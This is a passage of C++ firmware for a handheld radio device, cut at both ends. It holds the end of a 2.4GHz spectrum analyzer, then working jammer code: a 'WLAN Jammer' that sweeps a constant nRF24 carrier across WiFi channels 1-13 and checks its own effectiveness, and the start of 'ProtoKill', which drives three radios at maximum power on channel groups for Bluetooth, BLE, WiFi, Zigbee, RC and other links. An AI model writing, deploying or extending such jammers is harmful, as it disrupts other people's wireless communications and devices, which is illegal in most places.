    for (int y = WATERFALL_Y; y < WATERFALL_Y + WATERFALL_HEIGHT; y += 6) {
        tft.drawPixel(x1, y, TFT_DARKGREY);
        tft.drawPixel(x6, y, TFT_DARKGREY);
        tft.drawPixel(x11, y, TFT_DARKGREY);
        tft.drawPixel(x13, y, TFT_DARKGREY);
    }

    // Labels above spectrum
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x1 - 4, GRAPH_Y - 10);
    tft.print("1");
    tft.setCursor(x6 - 4, GRAPH_Y - 10);
    tft.print("6");
    tft.setCursor(x11 - 8, GRAPH_Y - 10);
    tft.print("11");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(x13 - 8, GRAPH_Y - 10);
    tft.print("13");
}

void drawAxes() {
    // Y-axis for spectrum
    tft.drawLine(GRAPH_X - 2, GRAPH_Y, GRAPH_X - 2, GRAPH_Y + GRAPH_HEIGHT, WHITE);
    // X-axis for spectrum
    tft.drawLine(GRAPH_X, GRAPH_Y + GRAPH_HEIGHT, GRAPH_X + GRAPH_WIDTH, GRAPH_Y + GRAPH_HEIGHT, WHITE);

    // Frequency labels between spectrum and waterfall
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(GRAPH_X - 5, GRAPH_Y + GRAPH_HEIGHT + 3);
    tft.print("2400");
    tft.setCursor(GRAPH_X + GRAPH_WIDTH/2 - 15, GRAPH_Y + GRAPH_HEIGHT + 3);
    tft.print("2442");
    tft.setCursor(GRAPH_X + GRAPH_WIDTH - 25, GRAPH_Y + GRAPH_HEIGHT + 3);
    tft.print("2484");

    // Divider line before waterfall
    tft.drawLine(0, WATERFALL_Y - 2, 240, WATERFALL_Y - 2, ORANGE);

    // Waterfall label
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setCursor(85, WATERFALL_Y + WATERFALL_HEIGHT + 2);
    tft.print("WATERFALL");
}

void drawSpectrum() {
    // Clear spectrum graph area only (not waterfall)
    tft.fillRect(GRAPH_X, GRAPH_Y, GRAPH_WIDTH, GRAPH_HEIGHT, TFT_BLACK);

    // Draw WiFi channel markers first (behind bars)
    drawWiFiMarkers();

    // Find max for scaling reference
    uint8_t maxLevel = 1;
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > maxLevel) maxLevel = current_levels[i];
    }

    // Draw spectrum bars - TEAL TO MAGENTA GRADIENT
    for (int i = 0; i < ANA_CHANNELS; i++) {
        int x = GRAPH_X + (i * GRAPH_WIDTH / ANA_CHANNELS);

        // Current level bar - scaled to visible range
        int barHeight = (current_levels[i] * GRAPH_HEIGHT) / 30;
        if (barHeight < 3 && current_levels[i] > 0) barHeight = 3;  // Minimum visible
        if (barHeight > GRAPH_HEIGHT) barHeight = GRAPH_HEIGHT;

        if (barHeight > 0) {
            // HaleHound gradient - Teal to Pink
            for (int y = 0; y < barHeight; y++) {
                float ratio = (float)y / (float)GRAPH_HEIGHT;

                // Teal RGB(0, 207, 255) -> Hot Pink RGB(255, 28, 82)
                uint8_t r = 0 + (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * 179);
                uint8_t b = 255 - (uint8_t)(ratio * 173);

                uint16_t color = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
                int drawY = GRAPH_Y + GRAPH_HEIGHT - barHeight + y;
                tft.drawFastHLine(x, drawY, BAR_WIDTH, color);
            }
        }

        // Peak hold indicator (small dot at peak)
        if (peak_levels[i] > 0) {
            int peakY = GRAPH_Y + GRAPH_HEIGHT - (peak_levels[i] * GRAPH_HEIGHT / 30);
            if (peakY < GRAPH_Y) peakY = GRAPH_Y;
            tft.drawPixel(x, peakY, TFT_WHITE);
        }
    }

    // Update and draw waterfall
    updateWaterfall();
    drawWaterfall();
}

void scanAllChannels() {
    // Reset current levels
    memset(current_levels, 0, sizeof(current_levels));

    // Scan each channel multiple times for better detection
    for (int sample = 0; sample < 30 && analyzerRunning; sample++) {
        // Check button every sample to prevent freeze
        if (pcf.digitalRead(BTN_SELECT) == LOW) {
            analyzerRunning = false;
            feature_exit_requested = true;
            return;
        }

        for (int ch = 0; ch < ANA_CHANNELS && analyzerRunning; ch++) {
            Scanner::setRegister(0x05, (uint8_t)ch);
            Scanner::enable();
            delayMicroseconds(140);
            Scanner::disable();
            if (Scanner::carrierDetected()) {
                current_levels[ch]++;
            }
        }
    }

    // Update peak levels
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > peak_levels[i]) {
            peak_levels[i] = current_levels[i];
        }
    }
}

void drawHeader() {
    tft.fillRect(0, 20, 240, 18, TFT_BLACK);

    // Title
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(45, 22);
    tft.print("2.4GHz SPECTRUM ANALYZER");

    // Divider line
    tft.drawLine(0, 38, 240, 38, ORANGE);

    // Find peak frequency
    int peakCh = 0;
    uint8_t peakVal = 0;
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > peakVal) {
            peakVal = current_levels[i];
            peakCh = i;
        }
    }

    // Peak info in status area (use status bar area or below header)
    // Will be shown in bottom area instead to save space
}

void drawStatusArea() {
    // Draw status info at very bottom of screen
    tft.fillRect(0, 310, 240, 10, TFT_BLACK);

    // Find peak
    int peakCh = 0;
    uint8_t peakVal = 0;
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > peakVal) {
            peakVal = current_levels[i];
            peakCh = i;
        }
    }

    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(5, 310);
    tft.printf("Peak:%dMHz Lv:%d", 2400 + peakCh, peakVal);

    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setCursor(140, 310);
    tft.print("SEL:Exit L:Rst");
}

void resetPeaks() {
    memset(peak_levels, 0, sizeof(peak_levels));
    clearWaterfallBuffer();  // Also clear waterfall when resetting
}

void analyzerSetup() {
    tft.init();
    tft.setRotation(2);
    tft.fillScreen(TFT_BLACK);

    // Initialize waterfall color palette
    initWaterfallPalette();

    // Initialize arrays
    memset(current_levels, 0, sizeof(current_levels));
    memset(peak_levels, 0, sizeof(peak_levels));
    clearWaterfallBuffer();

    // Draw static UI elements
    drawHeader();
    drawAxes();

    // ═══════════════════════════════════════════════════════════════════════════
    // SubGHz Cleanup - Release pin 16 and SPI bus before nRF24 init
    // Pin 16 is shared: CC1101 GDO0/RX (with interrupt) AND nRF24 CE (GPIO output)
    // ONLY cleanup if SubGHz receive was actually enabled (prevents crash)
    // ═══════════════════════════════════════════════════════════════════════════

    const bool radioOk = Scanner::radioInitAndProbe();
    (void)radioOk;
    setupTouchscreen();

    analyzerRunning = true;
    lastScanTime = millis();
    lastDisplayTime = millis();

    float voltage = readBatteryVoltage();
    drawStatusBar(voltage, false);

    // Initial status area
    drawStatusArea();
}

void analyzerLoop() {
    // Check for exit button
    if (pcf.digitalRead(BTN_SELECT) == LOW) {
        analyzerRunning = false;
        feature_exit_requested = true;
        // Reinitialize touch SPI before exiting - NRF24 reconfigured SPI bus
        setupTouchscreen();
        delay(200);
        return;
    }

    // Check for reset peaks button (LEFT)
    if (pcf.digitalRead(BTN_LEFT) == LOW) {
        resetPeaks();
        delay(200);
    }

    // Continuous scanning
    scanAllChannels();
    bool any = false;
    for (int i = 0; i < ANA_CHANNELS; i++) {
      if (current_levels[i] > 0) { any = true; break; }
    }
    if (!any) {
      if (++Scanner::flatSweepCount >= 3) {
        Scanner::radioInitAndProbe(5);
        Scanner::flatSweepCount = 0;
      }
    } else {
      Scanner::flatSweepCount = 0;
    }

    // Update display at ~15 FPS
    if (millis() - lastDisplayTime >= 66) {
        drawSpectrum();
        drawStatusArea();
        lastDisplayTime = millis();
    }
}

}  // namespace Analyzer


/*
 *
 * 2.4GHz WLAN Jammer - WiFi-specific jamming with correct channel mapping
 * Uses single NRF24L01 with rapid channel hopping
 *
*/

namespace WLANJammer {

#define WLAN_CE  CE_PIN_1
#define WLAN_CSN CSN_PIN_1

// WiFi channel center frequencies mapped to NRF24 channels
// WiFi Ch X center = 2407 + (X * 5) MHz
// NRF24 channel = frequency - 2400
// WiFi channels are ~22MHz wide, so we sweep ±11 channels around center

// WiFi channel start/end NRF24 channels (covering 22MHz width)
const uint8_t WIFI_CH_START[] = {1, 6, 11, 16, 21, 26, 31, 36, 41, 46, 51, 56, 61};  // Ch 1-13
const uint8_t WIFI_CH_END[] =   {23, 28, 33, 38, 43, 48, 53, 58, 63, 68, 73, 78, 83}; // Ch 1-13
const uint8_t WIFI_CH_CENTER[] = {12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72}; // Centers

#define NUM_WIFI_CHANNELS 13
#define ALL_CHANNELS_MODE 0

// NRF24 register addresses
#define NRF_CONFIG      0x00
#define NRF_EN_AA       0x01
#define NRF_RF_CH       0x05
#define NRF_RF_SETUP    0x06
#define NRF_STATUS      0x07
#define NRF_RPD         0x09

// Direct SPI functions (same technique as working Analyzer)
byte wlanGetReg(byte reg) {
    byte val;
    digitalWrite(WLAN_CSN, LOW);
    SPI.transfer(reg & 0x1F);
    val = SPI.transfer(0);
    digitalWrite(WLAN_CSN, HIGH);
    return val;
}

void wlanSetReg(byte reg, byte val) {
    digitalWrite(WLAN_CSN, LOW);
    SPI.transfer((reg & 0x1F) | 0x20);
    SPI.transfer(val);
    digitalWrite(WLAN_CSN, HIGH);
}

void wlanSetChannel(byte ch) {
    wlanSetReg(NRF_RF_CH, ch);
}

void wlanPowerUp() {
    wlanSetReg(NRF_CONFIG, wlanGetReg(NRF_CONFIG) | 0x02);
    delayMicroseconds(1500);  // Power-up delay
}

void wlanPowerDown() {
    wlanSetReg(NRF_CONFIG, wlanGetReg(NRF_CONFIG) & ~0x02);
}

void wlanEnableRX() {
    wlanSetReg(NRF_CONFIG, wlanGetReg(NRF_CONFIG) | 0x01);  // PRIM_RX
    digitalWrite(WLAN_CE, HIGH);
    delayMicroseconds(130);
}

void wlanDisable() {
    digitalWrite(WLAN_CE, LOW);
}

bool wlanCarrierDetected() {
    return wlanGetReg(NRF_RPD) & 0x01;
}

// Start constant carrier (jamming)
void wlanStartCarrier(byte channel) {
    wlanSetChannel(channel);
    // RF_SETUP: CONT_WAVE=1 (bit7), PLL_LOCK=1 (bit4), 0dBm power
    wlanSetReg(NRF_RF_SETUP, 0x9E);
    digitalWrite(WLAN_CE, HIGH);
}

// Stop constant carrier
void wlanStopCarrier() {
    wlanDisable();
    wlanSetReg(NRF_RF_SETUP, 0x0F);
}

bool jammerActive = false;
int currentWiFiChannel = ALL_CHANNELS_MODE;  // 0 = ALL, 1-13 = specific channel
int currentNRFChannel = 0;
unsigned long lastHopTime = 0;
unsigned long lastDisplayTime = 0;
unsigned long lastScanTime = 0;
const int HOP_DELAY_US = 500;  // Microseconds between channel hops
const int SCAN_INTERVAL_MS = 2000;  // Scan signals every 2 seconds

// Signal detection (to verify jamming effectiveness)
uint8_t signalLevels[13] = {0};  // 0-100% signal detected per WiFi channel
uint8_t signalHistory[13][5];    // Rolling history for smoothing
uint8_t historyIndex = 0;

// Display constants
#define JAM_GRAPH_X 10
#define JAM_GRAPH_Y 100
#define JAM_GRAPH_WIDTH 220
#define JAM_GRAPH_HEIGHT 150

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;
unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 300;

// Forward declarations
void configureRadio();

void drawHeader() {
    tft.fillRect(0, 0, 240, 50, TFT_BLACK);

    // Title
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(60, 5);
    tft.print("2.4GHz WLAN JAMMER");

    // Status
    tft.setTextColor(jammerActive ? TFT_RED : TFT_GREEN, TFT_BLACK);
    tft.setCursor(80, 20);
    tft.printf("Status: %s", jammerActive ? "JAMMING" : "STANDBY");

    // Current mode
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 35);
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        tft.print("Mode: ALL WiFi Channels (1-13)");
    } else {
        int freq = 2407 + (currentWiFiChannel * 5);
        tft.printf("Mode: WiFi Ch %d (%d MHz)", currentWiFiChannel, freq);
    }

    // Divider
    tft.drawLine(0, 50, 240, 50, TFT_RED);
}

void drawButtonGuide() {
    tft.fillRect(0, 270, 240, 50, TFT_BLACK);

    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setTextSize(1);

    // UP = Toggle jammer
    tft.setCursor(10, 275);
    tft.print("UP: Toggle ON/OFF");

    // LEFT/RIGHT = Change channel
    tft.setCursor(10, 290);
    tft.print("L/R: Change WiFi Channel");

    // SELECT = Exit
    tft.setCursor(10, 305);
    tft.print("SELECT: Exit");
}

void drawChannelDisplay() {
    // Position: below signal bars (77) - channel numbers
    int channelY = 80;
    tft.fillRect(JAM_GRAPH_X, channelY, JAM_GRAPH_WIDTH, 15, TFT_BLACK);

    // Draw WiFi channel indicators
    tft.setTextSize(1);
    for (int ch = 1; ch <= 13; ch++) {
        int x = JAM_GRAPH_X + ((ch - 1) * JAM_GRAPH_WIDTH / 13);

        // Highlight selected channel(s)
        if (currentWiFiChannel == ALL_CHANNELS_MODE || currentWiFiChannel == ch) {
            if (jammerActive) {
                tft.setTextColor(TFT_RED, TFT_BLACK);
            } else {
                tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            }
        } else {
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        }

        tft.setCursor(x + 2, channelY);
        if (ch < 10) {
            tft.printf(" %d", ch);  // Align single digits
        } else {
            tft.printf("%d", ch);
        }
    }
}

void drawSpectrumBar() {
    // Clear graph area
    tft.fillRect(JAM_GRAPH_X, JAM_GRAPH_Y, JAM_GRAPH_WIDTH, JAM_GRAPH_HEIGHT, TFT_BLACK);

    // Draw border
    tft.drawRect(JAM_GRAPH_X - 1, JAM_GRAPH_Y - 1, JAM_GRAPH_WIDTH + 2, JAM_GRAPH_HEIGHT + 2, WHITE);

    if (!jammerActive) {
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.setCursor(JAM_GRAPH_X + 60, JAM_GRAPH_Y + 70);
        tft.print("JAMMER INACTIVE");
        return;
    }

    // Draw activity bar for current NRF24 channel
    int barWidth = JAM_GRAPH_WIDTH / 126;  // 126 NRF24 channels (0-125)
    if (barWidth < 2) barWidth = 2;

    int x = JAM_GRAPH_X + (currentNRFChannel * JAM_GRAPH_WIDTH / 126);

    // Draw the jamming bar
    tft.fillRect(x, JAM_GRAPH_Y + 10, barWidth, JAM_GRAPH_HEIGHT - 20, TFT_RED);

    // Show current NRF24 channel
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setCursor(JAM_GRAPH_X + JAM_GRAPH_WIDTH/2 - 40, JAM_GRAPH_Y + JAM_GRAPH_HEIGHT + 5);
    tft.printf("NRF24 Ch: %d (%d MHz)", currentNRFChannel, 2400 + currentNRFChannel);

    // Highlight WiFi channel regions
    for (int ch = 1; ch <= 13; ch++) {
        if (currentWiFiChannel == ALL_CHANNELS_MODE || currentWiFiChannel == ch) {
            int startX = JAM_GRAPH_X + (WIFI_CH_START[ch-1] * JAM_GRAPH_WIDTH / 126);
            int endX = JAM_GRAPH_X + (WIFI_CH_END[ch-1] * JAM_GRAPH_WIDTH / 126);
            tft.drawRect(startX, JAM_GRAPH_Y + 2, endX - startX, JAM_GRAPH_HEIGHT - 4, TFT_YELLOW);
        }
    }
}

// Scan signals using DIRECT SPI - exact same as Scanner's scanChannels()
void scanSignals() {
    bool wasJamming = jammerActive;
    int savedChannel = currentNRFChannel;

    // Stop jamming to scan
    if (wasJamming) {
        wlanStopCarrier();
        jammerActive = false;
    }

    Scanner::disable();
    Scanner::powerUp();
    Scanner::setRegister(0x01, 0x00);
    Scanner::setRegister(0x06, 0x0F);

    // Scan each WiFi channel - use Scanner's scanChannels() pattern
    for (int wifiCh = 0; wifiCh < 13; wifiCh++) {
        int detections = 0;
        int totalSamples = 0;

        // Sample across the WiFi channel bandwidth
        for (int nrfCh = WIFI_CH_START[wifiCh]; nrfCh <= WIFI_CH_END[wifiCh]; nrfCh += 2) {
            // Multiple samples per NRF channel (like Scanner's 50 cycles)
            for (int s = 0; s < 5; s++) {
                Scanner::setRegister(0x05, (uint8_t)nrfCh);
                Scanner::enable();
                delayMicroseconds(140);
                Scanner::disable();
                if (Scanner::carrierDetected()) {
                    detections++;
                }
                totalSamples++;
            }
        }

        // Calculate signal level with balanced 5x boost
        // Raw detection rate: 2%=weak, 5%=low, 10%=medium, 20%=strong
        // After 5x: 10%=weak, 25%=low, 50%=medium, 100%=strong
        int rawPct = (totalSamples > 0) ? (detections * 100) / totalSamples : 0;
        int boostedPct = rawPct * 5;  // Balanced 5x boost
        if (boostedPct > 100) boostedPct = 100;

        // Store with light smoothing (avg of current + last)
        signalHistory[wifiCh][historyIndex] = boostedPct;
        signalLevels[wifiCh] = (signalHistory[wifiCh][historyIndex] +
                                signalHistory[wifiCh][(historyIndex + 4) % 5]) / 2;

        // If ANY detection, ensure visible (minimum 10%)
        if (detections > 0 && signalLevels[wifiCh] < 10) {
            signalLevels[wifiCh] = 10;
        }
    }

    historyIndex = (historyIndex + 1) % 5;

    // Resume jamming if it was active
    if (wasJamming) {
        wlanStartCarrier(savedChannel);
        currentNRFChannel = savedChannel;
        jammerActive = true;
    }

    lastScanTime = millis();
}

// Draw signal level bars for each WiFi channel
void drawSignalBars() {
    // Position: below header (55) but above channel numbers (65)
    int legendY = 52;
    int barAreaY = 65;
    int barHeight = 12;
    int barSpacing = JAM_GRAPH_WIDTH / 13;

    // Legend
    tft.setTextSize(1);
    tft.fillRect(JAM_GRAPH_X, legendY, JAM_GRAPH_WIDTH, 10, TFT_BLACK);
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setCursor(JAM_GRAPH_X, legendY);
    tft.print("SIGNAL: ");
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.print("HI ");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.print("MED ");
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.print("LOW/JAM");

    for (int ch = 0; ch < 13; ch++) {
        int x = JAM_GRAPH_X + (ch * barSpacing);
        int barWidth = barSpacing - 2;

        // Clear area for this bar
        tft.fillRect(x, barAreaY, barWidth, barHeight, TFT_BLACK);

        // Draw signal strength bar (vertical fill from bottom)
        int fillHeight = (signalLevels[ch] * barHeight) / 100;
        if (fillHeight < 1 && signalLevels[ch] > 0) fillHeight = 1;

        if (fillHeight > 0) {
            // Color based on signal level (green = signal, red = no signal/jammed)
            uint16_t color;
            if (signalLevels[ch] > 60) {
                color = TFT_GREEN;  // Strong signal (not jammed well)
            } else if (signalLevels[ch] > 30) {
                color = TFT_YELLOW;  // Medium signal
            } else {
                color = TFT_RED;  // Weak signal (jammed!)
            }

            // Fill from bottom up
            tft.fillRect(x, barAreaY + barHeight - fillHeight, barWidth, fillHeight, color);
        }

        // Draw border
        tft.drawRect(x, barAreaY, barWidth, barHeight, TFT_DARKGREY);
    }
}

// Initialize NRF24 for jamming (direct SPI - no RF24 library)
void initJammerRadio() {
    // Ensure pins are ready
    digitalWrite(WLAN_CE, LOW);
    digitalWrite(WLAN_CSN, HIGH);
    delay(5);

    // Power up
    wlanPowerUp();

    // Configure for jamming: no auto-ack, no CRC, 2Mbps, max power
    wlanSetReg(NRF_EN_AA, 0x00);      // Disable auto-ack
    wlanSetReg(NRF_CONFIG, 0x02);     // PWR_UP, PTX mode (not RX)
}

void startJamming() {
    // Verify NRF24 is responding
    byte status = Scanner::getRegister(0x07);
    if (status == 0x00 || status == 0xFF) {
        // Try to reinit
        wlanDisable();
        wlanPowerUp();
        wlanSetReg(NRF_EN_AA, 0x00);
        wlanSetReg(NRF_RF_SETUP, 0x0F);
        status = Scanner::getRegister(0x07);
        if (status == 0x00 || status == 0xFF) {
            tft.setTextColor(TFT_RED, TFT_BLACK);
            tft.setCursor(10, 150);
            tft.print("ERROR: NRF24 not found!");
            return;
        }
    }

    // Start carrier on initial channel
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        currentNRFChannel = WIFI_CH_START[0];
    } else {
        currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
    }

    wlanStartCarrier(currentNRFChannel);
    jammerActive = true;
    lastHopTime = micros();
}

void stopJamming() {
    wlanStopCarrier();
    wlanPowerDown();
    jammerActive = false;
}

void hopChannel() {
    if (!jammerActive) return;

    // Determine next channel based on mode
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        // Sweep through all WiFi channels (1-83 covers Ch 1-13)
        currentNRFChannel++;
        if (currentNRFChannel > 83) {
            currentNRFChannel = 1;
        }
    } else {
        // Sweep within specific WiFi channel
        currentNRFChannel++;
        if (currentNRFChannel > WIFI_CH_END[currentWiFiChannel - 1]) {
            currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
        }
    }

    wlanSetChannel(currentNRFChannel);
}

void checkButtons() {
    unsigned long currentTime = millis();

    // UP = Toggle jammer
    if (pcf.digitalRead(BTN_UP) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
        jammerToggleRequested = true;
        lastButtonPressTime = currentTime;
    }

    // RIGHT = Next WiFi channel
    if (pcf.digitalRead(BTN_RIGHT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
        currentWiFiChannel++;
        if (currentWiFiChannel > 13) currentWiFiChannel = ALL_CHANNELS_MODE;
        if (jammerActive) {
            // Reset to start of new channel range
            if (currentWiFiChannel == ALL_CHANNELS_MODE) {
                currentNRFChannel = 1;
            } else {
                currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
            }
        }
        drawHeader();
        drawChannelDisplay();
        lastButtonPressTime = currentTime;
    }

    // LEFT = Previous WiFi channel
    if (pcf.digitalRead(BTN_LEFT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
        currentWiFiChannel--;
        if (currentWiFiChannel < 0) currentWiFiChannel = 13;
        if (jammerActive) {
            if (currentWiFiChannel == ALL_CHANNELS_MODE) {
                currentNRFChannel = 1;
            } else {
                currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
            }
        }
        drawHeader();
        drawChannelDisplay();
        lastButtonPressTime = currentTime;
    }

    // SELECT = Exit (handled in main loop)
}

void wlanjammerSetup() {
    tft.init();
    tft.setRotation(2);
    tft.fillScreen(TFT_BLACK);

    // ═══════════════════════════════════════════════════════════════════════════
    // SubGHz Cleanup - Release pin 16 and SPI bus before NRF24 init
    // Pin 16 is shared: CC1101 GDO0/RX (with interrupt) AND NRF24 CE (GPIO output)
    // ═══════════════════════════════════════════════════════════════════════════

    const bool radioOk = Scanner::radioInitAndProbe();
    (void)radioOk;
    setupTouchscreen();

    // Initialize radio pins
    pinMode(WLAN_CE, OUTPUT);
    pinMode(WLAN_CSN, OUTPUT);

    // Initialize PCF buttons
    pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
    pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
    pcf.pinMode(BTN_UP, INPUT_PULLUP);
    pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

    jammerActive = false;
    currentWiFiChannel = ALL_CHANNELS_MODE;
    currentNRFChannel = 0;

    // Initialize signal history
    for (int ch = 0; ch < 13; ch++) {
        signalLevels[ch] = 0;
        for (int h = 0; h < 5; h++) {
            signalHistory[ch][h] = 0;
        }
    }
    historyIndex = 0;

    float voltage = readBatteryVoltage();
    drawStatusBar(voltage, false);

    drawHeader();
    drawButtonGuide();
    drawChannelDisplay();
    drawSpectrumBar();

    pinMode(WLAN_CE, OUTPUT);
    pinMode(WLAN_CSN, OUTPUT);
    wlanDisable();

    // Check if responding
    byte status = Scanner::getRegister(0x07);

    if (status != 0x00 && status != 0xFF) {
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.setCursor(60, 150);
        tft.print("Scanning signals...");
        scanSignals();
        drawSignalBars();
    } else {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.setCursor(60, 150);
        tft.print("Radio not found!");
    }

    lastDisplayTime = millis();
    lastScanTime = millis();
}

void wlanjammerLoop() {
    // Check for exit
    if (pcf.digitalRead(BTN_SELECT) == LOW) {
        if (jammerActive) {
            stopJamming();
        }
        feature_exit_requested = true;
        // Reinitialize touch SPI before exiting - NRF24 reconfigured SPI bus
        setupTouchscreen();
        delay(200);
        return;
    }

    checkButtons();

    // Handle jammer toggle
    if (jammerToggleRequested) {
        jammerToggleRequested = false;
        if (jammerActive) {
            stopJamming();
        } else {
            startJamming();
        }
        drawHeader();
        drawChannelDisplay();
    }

    // Rapid channel hopping when active
    if (jammerActive) {
        if (micros() - lastHopTime >= HOP_DELAY_US) {
            hopChannel();
            lastHopTime = micros();
        }
    }

    // Periodic signal scan to verify jamming effectiveness
    if (millis() - lastScanTime >= SCAN_INTERVAL_MS) {
        scanSignals();
        bool any = false;
        for (int i = 0; i < 13; i++) {
          if (signalLevels[i] > 0) { any = true; break; }
        }
        if (!any) {
          Scanner::radioInitAndProbe(5);
        }
        drawSignalBars();
    }

    // Update display at ~10 FPS
    if (millis() - lastDisplayTime >= 100) {
        drawSpectrumBar();
        lastDisplayTime = millis();
    }
}

}  // namespace WLANJammer


/*
 *
 * ProtoKill
 * 
 * 
*/


namespace ProtoKill {

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE, WiFi_MODULE, VIDEO_TX_MODULE, RC_MODULE, USB_WIRELESS_MODULE, ZIGBEE_MODULE, NRF24_MODULE };
OperationMode currentMode = WiFi_MODULE;

bool jammerActive = false;

const byte bluetooth_channels[] =        {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[] =              {2, 26, 80};
const byte WiFi_channels[] =             {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[] =               {1, 3, 5, 7};
const byte zigbee_channels[] =           {11, 15, 20, 25};
const byte nrf24_channels[] =            {76, 78, 79};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 300
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool modeChangeRequested1 = false;
volatile bool jammerToggleRequested = false;

unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 500;

void scroll() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = TFT_WHITE;
    Index++;
  }

  for (int i = 0; i < Index; i++) {
    int yPos = (i * LINE_HEIGHT) + 48;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  unsigned long currentTime = millis();

  if (pcf.digitalRead(BTN_UP) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    jammerToggleRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_RIGHT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_LEFT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested1 = true;
    lastButtonPressTime = currentTime;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int  previousMode = -1;

  tft.fillRect(0, 39, 240, 320, TFT_BLACK);
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);
